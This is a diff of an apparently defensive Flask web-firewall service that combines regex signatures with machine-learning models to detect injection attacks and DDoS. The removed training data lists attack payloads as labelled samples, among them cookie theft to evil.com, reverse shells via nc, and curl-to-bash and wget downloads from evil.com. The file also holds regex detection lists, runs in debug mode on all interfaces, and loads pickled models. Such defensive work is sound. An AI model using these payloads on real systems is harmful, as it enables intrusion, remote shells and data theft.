@@ -1,213 +1,156 @@
-"""
-WEJÀ AI Engine - Hybrid Attack Detection Service
-Combines rule-based pattern matching with ML-based confidence scoring.
-"""
-
 import re
+import sys
+import time
+import pickle
 import numpy as np
+import pandas as pd
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-import pickle
 import joblib
-
-# ML imports
-from sklearn.feature_extraction.text import TfidfVectorizer
-from sklearn.linear_model import LogisticRegression
-from sklearn.preprocessing import LabelEncoder
 
 app = Flask(__name__)
 CORS(app)
 
+# ==========================================
+# 1. CUSTOM FEATURE EXTRACTION (MUST BE FIRST)
+# ==========================================
 
-
-
-# Login using e.g. `huggingface-cli login` to access this dataset
-
-# ============ ML MODEL TRAINING DATA ============
-# Sample training data for the ML model
-# TRAINING_DATA = [
-#     # SQL Injection samples
-#     ("' OR 1=1 --", "SQL_INJECTION"),
-#     ("'; DROP TABLE users; --", "SQL_INJECTION"),
-#     ("1' AND '1'='1", "SQL_INJECTION"),
-#     ("admin'--", "SQL_INJECTION"),
-#     ("' UNION SELECT * FROM users --", "SQL_INJECTION"),
-#     ("1; SELECT * FROM information_schema.tables", "SQL_INJECTION"),
-#     ("' OR 'x'='x", "SQL_INJECTION"),
-#     ("1' OR '1'='1' /*", "SQL_INJECTION"),
-#     ("'; EXEC xp_cmdshell('dir'); --", "SQL_INJECTION"),
-#     ("1 AND 1=1 UNION SELECT null, username, password FROM users", "SQL_INJECTION"),
-    
-#     # XSS samples
-#     ("<script>alert('XSS')</script>", "XSS"),
-#     ("<img src=x onerror=alert(1)>", "XSS"),
-#     ("javascript:alert(document.cookie)", "XSS"),
-#     ("<svg onload=alert(1)>", "XSS"),
-#     ("<body onload=alert('XSS')>", "XSS"),
-#     ("<iframe src='javascript:alert(1)'>", "XSS"),
-#     ("'\"><script>alert(String.fromCharCode(88,83,83))</script>", "XSS"),
-#     ("<input onfocus=alert(1) autofocus>", "XSS"),
-#     ("document.location='http://evil.com?c='+document.cookie", "XSS"),
-#     ("<div style=\"background:url(javascript:alert('XSS'))\">", "XSS"),
-    
-#     # Path Traversal samples
-#     ("../../../etc/passwd", "PATH_TRAVERSAL"),
-#     ("....//....//etc/passwd", "PATH_TRAVERSAL"),
-#     ("%2e%2e%2f%2e%2e%2fetc/passwd", "PATH_TRAVERSAL"),
-#     ("..\\..\\..\\windows\\system32\\config\\sam", "PATH_TRAVERSAL"),
-#     ("/var/www/../../etc/shadow", "PATH_TRAVERSAL"),
-#     ("file:///etc/passwd", "PATH_TRAVERSAL"),
-#     ("....//....//....//etc/passwd", "PATH_TRAVERSAL"),
-#     ("%252e%252e%252fetc/passwd", "PATH_TRAVERSAL"),
-    
-#     # Command Injection samples
-#     ("; ls -la", "COMMAND_INJECTION"),
-#     ("| cat /etc/passwd", "COMMAND_INJECTION"),
-#     ("`whoami`", "COMMAND_INJECTION"),
-#     ("$(cat /etc/passwd)", "COMMAND_INJECTION"),
-#     ("; rm -rf /", "COMMAND_INJECTION"),
-#     ("&& wget http://evil.com/shell.sh", "COMMAND_INJECTION"),
-#     ("| nc -e /bin/sh 10.0.0.1 4444", "COMMAND_INJECTION"),
-#     ("; curl http://evil.com/malware | bash", "COMMAND_INJECTION"),
-    
-#     # Safe/Normal samples
-#     ("Hello World", "SAFE"),
-#     ("Search for products", "SAFE"),
-#     ("user@example.com", "SAFE"),
-#     ("Contact us for more information", "SAFE"),
-#     ("Add item to cart", "SAFE"),
-#     ("View order history", "SAFE"),
-#     ("Update profile settings", "SAFE"),
-#     ("Download invoice PDF", "SAFE"),
-#     ("GET /api/users/123", "SAFE"),
-#     ("POST /api/orders", "SAFE"),
-#     ("username=john&password=secret123", "SAFE"),
-#     ("filter=price&sort=asc", "SAFE"),
-# ]
-
-
-# NEW_DATA_SET = pd.read_csv("payload_full.csv")
-
-# dataset = NEW_DATA_SET[""]
-
-# # Initialize ML model
-# print("[*] Training ML model...")
-# texts = [t[0] for t in TRAINING_DATA]
-# labels = [t[1] for t in TRAINING_DATA]
-
-# Feature extraction
-# vectorizer = TfidfVectorizer(
-#     analyzer='char',
-#     ngram_range=(2, 5),
-#     max_features=1000
-# )
-# X = vectorizer.fit_transform(texts)
-
-# # Label encoding
-# label_encoder = LabelEncoder()
-# y = label_encoder.fit_transform(labels)
-
-# # Train model
-# ml_model = LogisticRegression(max_iter=1000)
-# ml_model.fit(X, y)
-# print("[OK] ML model trained successfully!")
 def extract_special_features(texts):
-    import numpy as np
-    import re
-
-    features = []
-
+    """
+    Custom feature engineering function required by the Tier 1 Logistic Regression model.
+    Must be defined before joblib.load() executes.
+    """
+    feature_matrix = []
     for text in texts:
         if not isinstance(text, str):
             text = str(text)
-
-        text_lower = text.lower()
-
-        features.append([
+        lower_text = text.lower()
+        
+        features = [
             int('../' in text or '..\\' in text),
             int('%' in text),
             int(text.count('/') > 3),
-            int(re.search(r'etc/passwd|windows\\win', text_lower) is not None),
-            len(re.findall(r'%[0-9a-f]{2}', text_lower)),
+            int(re.search(r'etc/passwd|windows\\win', lower_text) is not None),
+            len(re.findall(r'%[0-9a-f]{2}', lower_text)),
             text.count('.'),
             int(';' in text or '|' in text or '&' in text),
-            int('=' in text and '../' in text),
-        ])
+            int('=' in text and '../' in text)
+        ]
+        feature_matrix.append(features)
+    return np.array(feature_matrix)
 
-    return np.array(features)
 
-#Load pre-trained model
-preTrainedModel = joblib.load('waf_ai_engine_logistic_regression.pkl')
-print("Model loaded successfully")
+# Ensure the custom feature extraction helper is available for legacy joblib unpickling
+import __main__
+current_module = sys.modules[__name__]
+if '__main__' not in sys.modules or sys.modules['__main__'] is not current_module:
+    sys.modules['__main__'] = current_module
+setattr(sys.modules['__main__'], 'extract_special_features', extract_special_features)
 
-#Load label encoding
-label_encoder = joblib.load('label_encoder.pkl')
-print("Label encoder loaded successfully")
-#new function
-def predict_threat(request_text: str) -> tuple:
-    """
-    Predict attack type using the trained pipeline.
-    Returns: (label, confidence)
-    """
 
-    if not request_text or len(request_text.strip()) == 0:
-        return "SAFE", 0.1
+# ==========================================
+# 2. GLOBAL DATA PATHS & MODEL LOADING
+# ==========================================
 
-    try:
-        # Predict class index
-        pred_class = preTrainedModel.predict([request_text])[0]
-
-        # Predict probabilities
-        probs = preTrainedModel.predict_proba([request_text])[0]
-        confidence = float(np.max(probs))
-
-        # Decode label
-        predicted_label = label_encoder.inverse_transform([pred_class])[0]
-
-        return predicted_label, confidence
-
-    except Exception as e:
-        app.logger.error(f"ML prediction error: {e}")
-        return "SAFE", 0.1
-#old function
-# def predict_threat(request_text: str) -> tuple:
-#     """
-#     Use ML model to predict threat type and confidence.
-#     Returns: (predicted_type, confidence_score)
-#     """
-#     if not request_text or len(request_text.strip()) == 0:
-#         return "SAFE", 0.1
+# Tier 1 Models (Payload Signature / Semantic Analytics)
+try:
+    payload_model = joblib.load('waf_ai_engine_logistic_regression.pkl')
+    print("[Tier 1] Logistic Regression payload model loaded successfully.")
     
-#     try:
-#         # Transform input text
-#         X_new = vectorizer.transform([request_text])
+    label_encoder = joblib.load('label_encoder.pkl')
+    print("[Tier 1] Label Encoder loaded successfully.")
+except Exception as e:
+    print(f"⚠️ Error loading Tier 1 core models: {e}")
+
+# Tier 2 Model (Behavioral / Sequence / DDoS Detection)
+try:
+    tier2_behavior_model = joblib.load('tier2_behavior_model2.pkl')
+    print("[Tier 2] Behavioral Sequence model loaded successfully.")
+except Exception as e:
+    print(f"⚠️ Error loading Tier 2 behavior model: {e}")
+
+# In-memory monitoring states
+traffic_history = {}    
+banned_behavior_ips = set()  
+
+BEHAVIOR_FEATURES = [
+    'Flow Duration', 
+    'Flow IAT Mean', 
+    'Flow IAT Min', 
+    'Fwd Packet Length Mean', 
+    'Total Fwd Packets'
+]
+
+ATTACK_LABELS = {
+    0: "BENIGN",
+    1: "WEB_FUZZING_DETECTED",
+    2: "DDOS_FLOOD_DETECTED",
+    3: "PORT_SCAN_DETECTED"
+}
+
+# ==========================================
+# 3. NETWORK METRICS FUNCTIONS
+# ==========================================
+
+def calculate_network_metrics(client_ip, passed_total_packets=0):
+    history = traffic_history.get(client_ip, [])
+    if not history:
+        return {
+            'Flow Duration': 0.0,
+            'Flow IAT Mean': 0.0,
+            'Flow IAT Min': 0.0,
+            'Fwd Packet Length Mean': 0.0,
+            'Total Fwd Packets': passed_total_packets
+        }
         
-#         # Get prediction probabilities
-#         probs = preTrainedModel.predict_proba(X_new)[0]
-#         predicted_class = np.argmax(probs)
-#         confidence = float(probs[predicted_class])
+    timestamps = [item[0] for item in history]
+    lengths = [item[1] for item in history]
+    
+    if len(timestamps) > 1:
+        iat_deltas = np.diff(timestamps)
+        iat_mean = float(np.mean(iat_deltas))
+        iat_min = float(np.min(iat_deltas))
+    else:
+        iat_mean = 0.0
+        iat_min = 0.0
         
-#         # Decode label
-#         predicted_label = label_encoder.inverse_transform([predicted_class])[0]
-        
-#         return predicted_label, confidence
-#     except Exception as e:
-#         app.logger.error(f"ML prediction error: {e}")
-#         return "SAFE", 0.1
+    metrics = {
+        'Flow Duration': float(timestamps[-1] - timestamps[0]) if len(timestamps) > 1 else 0.0,
+        'Flow IAT Mean': iat_mean,
+        'Flow IAT Min': iat_min,
+        'Fwd Packet Length Mean': float(np.mean(lengths)) if lengths else 0.0,
+        'Total Fwd Packets': passed_total_packets if passed_total_packets > 0 else len(timestamps)
+    }
+    return metrics
 
 
-# ============ RULE-BASED DETECTION PATTERNS ============
+def predict_payload_anomaly(request_text):
+    if not request_text or len(request_text.strip()) == 0:
+        return 'SAFE', 0.10
+    try:
+        pred_id = payload_model.predict([request_text])[0]
+        probabilities = payload_model.predict_proba([request_text])[0]
+        confidence = float(np.max(probabilities))
+        attack_label = label_encoder.inverse_transform([pred_id])[0]
+        return attack_label, confidence
+    except Exception as err:
+        app.logger.error(f"ML prediction error: {err}")
+        return 'SAFE', 0.10
 
-SQLI_PATTERNS = [
+# ==========================================
+# 4. SIGNATURE RULES DEFENSE (TIER 1)
+# ==========================================
+
+SQL_PATTERNS = [
     r"(\%27)|(\')|(\-\-)|(\%23)|(#)",
     r"((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))",
-    r"\w*((\%27)|(\'))((\\%6F)|o|(\%4F))((\%72)|r|(\%52))",
+    r"\w*((\%27)|(\'))((\\\\%6F)|o|(\%4F))((\%72)|r|(\%52))",
     r"((\%27)|(\'))union",
     r"exec(\s|\+)+(s|x)p\w+",
     r"(select|insert|update|delete|drop|truncate|alter)\s",
     r"(\%27)|(\')\s*(or|and)\s*\d+\s*=\s*\d+",
     r"1\s*=\s*1",
-    r"\'\s*or\s*\'",
+    r"\'\s*or\s*\'"
 ]
 
 XSS_PATTERNS = [
@@ -222,7 +165,7 @@ XSS_PATTERNS = [
     r"expression\s*\(",
     r"alert\s*\(",
     r"document\.(cookie|location|write)",
-    r"eval\s*\(",
+    r"eval\s*\("
 ]
 
 PATH_TRAVERSAL_PATTERNS = [
@@ -232,7 +175,7 @@ PATH_TRAVERSAL_PATTERNS = [
     r"%252e%252e%252f",
     r"etc/passwd",
     r"etc/shadow",
-    r"windows/system32",
+    r"windows/system32"
 ]
 
 COMMAND_INJECTION_PATTERNS = [
@@ -240,144 +183,184 @@ COMMAND_INJECTION_PATTERNS = [
     r"\|\s*(ls|cat|whoami|id|pwd|uname)",
     r"`[^`]+`",
     r"\$\([^)]+\)",
-    r"&&\s*(ls|cat|whoami|id|pwd|uname)",
+    r"&&\s*(ls|cat|whoami|id|pwd|uname)"
 ]
 
-
-def rule_based_detect(payload: str) -> tuple:
-    """
-    Rule-based pattern matching detection.
-    Returns: (is_malicious, attack_type, confidence)
-    """
-    payload_lower = payload.lower()
-    
-    for pattern in SQLI_PATTERNS:
-        if re.search(pattern, payload_lower, re.IGNORECASE):
-            return True, "SQL_INJECTION", 0.90
-    
+def scan_signature_rules(payload):
+    lower_payload = payload.lower()
+    for pattern in SQL_PATTERNS:
+        if re.search(pattern, lower_payload, re.IGNORECASE):
+            return True, 'SQL_INJECTION', 0.90
     for pattern in XSS_PATTERNS:
-        if re.search(pattern, payload_lower, re.IGNORECASE):
-            return True, "XSS", 0.88
-    
+        if re.search(pattern, lower_payload, re.IGNORECASE):
+            return True, 'XSS', 0.88
     for pattern in PATH_TRAVERSAL_PATTERNS:
-        if re.search(pattern, payload_lower, re.IGNORECASE):
-            return True, "PATH_TRAVERSAL", 0.92
-    
+        if re.search(pattern, lower_payload, re.IGNORECASE):
+            return True, 'PATH_TRAVERSAL', 0.92
     for pattern in COMMAND_INJECTION_PATTERNS:
-        if re.search(pattern, payload_lower, re.IGNORECASE):
-            return True, "COMMAND_INJECTION", 0.94
-    
-    return False, "SAFE", 0.1
+        if re.search(pattern, lower_payload, re.IGNORECASE):
+            return True, 'COMMAND_INJECTION', 0.94
+    return False, 'SAFE', 0.10
 
 
-def detect_attack_type(payload: str) -> tuple:
-    """
-    Hybrid detection combining rule-based and ML approaches.
-    Returns: (is_malicious, attack_type, confidence)
-    """
-    # Get rule-based result
-    # rule_detected, rule_type, rule_conf = rule_based_detect(payload)
-    
-    # Get ML result
-    ml_type, ml_conf = predict_threat(payload)
-    
-    # Combine results with weighted scoring
-    # if rule_detected:
-    #     # Boost confidence if both methods agree
-    #     if rule_type == ml_type:
-    #         combined_conf = min(0.99, (rule_conf * 0.6 + ml_conf * 0.4) + 0.05)
-    #     else:
-    #         combined_conf = rule_conf
-    #     return True, rule_type, round(combined_conf, 2)
-    
-    # # If rule-based didn't detect but ML has high confidence
-    # if ml_type != "norm" and ml_conf > 0.7:
-    #     return True, ml_type, round(ml_conf * 0.85, 2)
-    
-    if ml_type != "norm" and ml_conf > 0.6:
-        return True, ml_type, round(ml_conf * 0.85, 2)
-    # No threat detected
-    return False, "SAFE", round(max(1 - ml_conf, 0.05), 2)
+def evaluate_hybrid_inspection(payload):
+    is_malicious, attack_type, rule_conf = scan_signature_rules(payload)
+    if is_malicious and rule_conf > 0.6:
+        return True, attack_type, round(rule_conf * 0.85, 2)
+    return False, 'SAFE', round(max(1 - rule_conf, 0.05), 2)
 
+# ==========================================
+# 5. FLASK SERVER CONTROLLERS / ENDPOINTS
+# ==========================================
 
 @app.route('/health', methods=['GET'])
 def health_check():
-    """Health check endpoint."""
     return jsonify({
-        "status": "healthy",
-        "service": "WEJÀ AI Engine",
-        "version": "1.1.0",
-        "ml_model": "LogisticRegression",
-        "detection": "Hybrid (Rule-based + ML)"
+        'status': 'healthy',
+        'service': 'WEJÀ AI Engine',
+        'version': '1.1.0',
+        'ml_model': 'LogisticRegression',
+        'detection': 'Hybrid (Rule-based + ML)'
     })
 
 
-@app.route('/analyze', methods=['POST'])
-def analyze_request():
-    """
-    Analyze incoming request payload for potential attacks.
-    
-    Expected JSON body:
-    {
-        "payload": "string to analyze",
-        "headers": {},
-        "method": "GET|POST|...",
-        "path": "/target/path"
-    }
-    """
+@app.route('/behavioural/analyze', methods=['POST'])
+def behavioural_analysis():
     try:
         data = request.get_json()
-        
         if not data:
+            return jsonify({'error': 'No JSON data provided', 'blocked': False, 'confidence': 0.0, 'type': 'UNKNOWN'}), 400
+        
+        client_ip = data.get('ip', request.remote_addr)
+        
+        if client_ip in banned_behavior_ips:
+            return jsonify({'blocked': True, 'type': 'AUTOMATED_ANOMALY_DDoS_FUZZ', 'confidence': 1.0}), 200
+
+        payload_content = data.get('payload', '')
+        payload_len = len(payload_content) if payload_content is not None else 0
+        current_time = time.time()
+        
+        traffic_history.setdefault(client_ip, [])
+        traffic_history[client_ip].append((current_time, payload_len))
+        traffic_history[client_ip] = traffic_history[client_ip][-200:]
+        
+        passed_total_packets = data.get('totalPackets', 0)
+        client_features = calculate_network_metrics(client_ip, passed_total_packets)
+
+        features_df = pd.DataFrame([client_features], columns=BEHAVIOR_FEATURES)
+
+        #debug print
+        print(f"\n[ML INPUT MATRIX] Total Packets received from Node: {passed_total_packets}")
+        print(f"{features_df.to_string(index=False)}\n")
+
+        try:
+            prediction_id = int(tier2_behavior_model.predict(features_df)[0])
+            confidence = float(tier2_behavior_model.predict_proba(features_df)[0][prediction_id])
+            prediction = 1 if prediction_id > 0 else 0
+
+        
+        except Exception as model_err:
+            app.logger.error(f"Inference error: {model_err}")
+            prediction = 0
+
+            confidence = 0.0
+
+        print(f"[Tier 2 Dedicated] IP={client_ip} | Window={len(traffic_history[client_ip])} | Pred={prediction} | Anomaly_Conf={confidence:.4f}")
+        print(f"[FEATURES MATRIX] Duration: {client_features['Flow Duration']:.4f} | Total Packets: {client_features['Total Fwd Packets']}")
+
+        if client_ip in banned_behavior_ips:
             return jsonify({
-                "error": "No JSON body provided",
-                "blocked": False,
-                "confidence": 0.0,
-                "type": "UNKNOWN"
-            }), 400
+              'blocked': True,
+              'type': "ALREADY_BANNED",
+              'confidence': 1.0
+          }), 200
+
+        if prediction == 1 and confidence > 0.6:
+            banned_behavior_ips.add(client_ip)
+            print(f"🚫 [Tier 2 BAN TRIGGERED] IP {client_ip} isolated!")
+            return jsonify({
+                'blocked': True,
+                'type': 'AUTOMATED_ANOMALY_DDoS_FUZZ',
+                'confidence': round(confidence, 2)
+            }), 200
+
+        return jsonify({
+            'blocked': False,
+            'type': 'SAFE',
+            'confidence': round(1 - confidence, 2)
+        }), 200
+
+    except Exception as global_err:
+        app.logger.error(f"Dedicated Tier 2 route failed: {str(global_err)}")
+        return jsonify({'error': str(global_err), 'blocked': False, 'confidence': 0.0, 'type': 'ERROR'}), 500
+
+
+@app.route('/analyze', methods=['POST'])
+def fallback_analyze():
+    try:
+        body_data = request.get_json()
+        if not body_data:
+            return jsonify({'error': 'No JSON body provided', 'blocked': False, 'confidence': 0.0, 'type': 'UNKNOWN'}), 400
         
-        payload = data.get('payload', '')
-        path = data.get('path', '')
-        method = data.get('method', 'GET')
+        client_ip = body_data.get('ip', request.remote_addr)
+        if client_ip in banned_behavior_ips:
+            return jsonify({'blocked': True, 'type': 'BANNED_IP_BEHAVIORAL', 'confidence': 1.0}), 403
+            
+        payload = body_data.get('payload', '')
+        current_time = time.time()
+        payload_len = len(payload) if payload is not None else 0
         
-        combined_payload = f"{payload} {path}"
+        traffic_history.setdefault(client_ip, [])
+        traffic_history[client_ip].append((current_time, payload_len))
+        traffic_history[client_ip] = traffic_history[client_ip][-200:]
         
-        # Perform hybrid detection
-        is_blocked, attack_type, confidence = detect_attack_type(combined_payload)
+        if len(traffic_history[client_ip]) >= 5:
+            metrics = calculate_network_metrics(client_ip)
+            features_df = pd.DataFrame([metrics], columns=BEHAVIOR_FEATURES)
+            try:
+                tier2_pred = int(tier2_behavior_model.predict(features_df)[0])
+                tier2_conf = float(tier2_behavior_model.predict_proba(features_df)[0][1])
+            except Exception as e:
+                app.logger.error(f"Tier2 execution failed inside fallback: {e}")
+                tier2_pred = 0
+                tier2_conf = 0.0
+                
+            if tier2_pred == 1 and tier2_conf > 0.9:
+                banned_behavior_ips.add(client_ip)
+                return jsonify({'blocked': True, 'type': 'AUTOMATED_ANOMALY_DDoS_FUZZ', 'confidence': tier2_conf}), 403
+                
+        req_path = body_data.get('path', '')
+        req_method = body_data.get('method', 'GET')
+        combined_string = f"{payload} {req_path}"
         
-        # Get ML prediction for additional info
-        ml_type, ml_conf = predict_threat(combined_payload)
+        is_blocked, attack_label, final_confidence = evaluate_hybrid_inspection(combined_string)
+        ml_label, ml_conf = predict_payload_anomaly(combined_string)
         
-        response = {
-            "blocked": is_blocked,
-            "confidence": confidence,
-            "type": attack_type,
-            "analyzed_method": method,
-            "analyzed_path": path,
-            "payload_length": len(payload),
-            "ml_prediction": ml_type,
-            "ml_confidence": round(ml_conf, 2)
+        response_payload = {
+            'blocked': is_blocked,
+            'confidence': final_confidence,
+            'type': attack_label,
+            'analyzed_method': req_method,
+            'analyzed_path': req_path,
+            'payload_length': len(payload),
+            'ml_prediction': ml_label,
+            'ml_confidence': round(ml_conf, 2)
         }
         
         if is_blocked:
-            app.logger.warning(f"🚨 Attack detected: {attack_type} (confidence: {confidence})")
+            app.logger.warning(f"Attack detected: {attack_label} (confidence: {final_confidence})")
         else:
-            app.logger.info(f"✅ Request clean (confidence: {confidence})")
+            app.logger.info(f"✅ Request clean (confidence: {final_confidence})")
+            
+        return jsonify(response_payload)
         
-        return jsonify(response)
-    
     except Exception as e:
         app.logger.error(f"Analysis error: {str(e)}")
-        return jsonify({
-            "error": str(e),
-            "blocked": False,
-            "confidence": 0.0,
-            "type": "ERROR"
-        }), 500
+        return jsonify({'error': str(e), 'blocked': False, 'confidence': 0.0, 'type': 'ERROR'}), 500
 
 
 if __name__ == '__main__':
-    print("[WEJA] AI Engine starting...")
-    print("[*] Listening on http://localhost:5000")
-    print("[*] Using hybrid detection: Rule-based + ML (LogisticRegression)")
+    print('[WEJA] AI Engine starting...')
+    print('[*] Listening on http://localhost:5000')
+    print('[*] Using hybrid detection: Rule-based + ML (LogisticRegression) + Tier 2 Sequence Behavior')
     app.run(host='0.0.0.0', port=5000, debug=True)
